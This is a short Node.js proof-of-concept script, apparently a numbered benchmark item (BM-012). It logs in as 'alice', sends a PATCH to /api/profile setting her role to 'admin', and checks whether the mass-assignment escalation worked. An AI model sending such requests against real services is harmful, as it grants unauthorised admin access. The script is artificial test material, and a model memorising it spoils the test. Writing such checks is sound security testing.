'use strict';

const poc = require('./lib/common');

// BM-012: mass assignment on PATCH /api/profile (alice makes herself admin).
poc.run(async function () {
  const token = await poc.login('alice');
  const headers = poc.bearer(token);
  await poc.request('PATCH', '/api/profile', { headers: headers, body: { role: 'admin' } });
  const me = await poc.request('GET', '/api/profile', { headers: headers });
  poc.finish(JSON.parse(me.body).role === 'admin', 'role after patch: ' + JSON.parse(me.body).role);
});
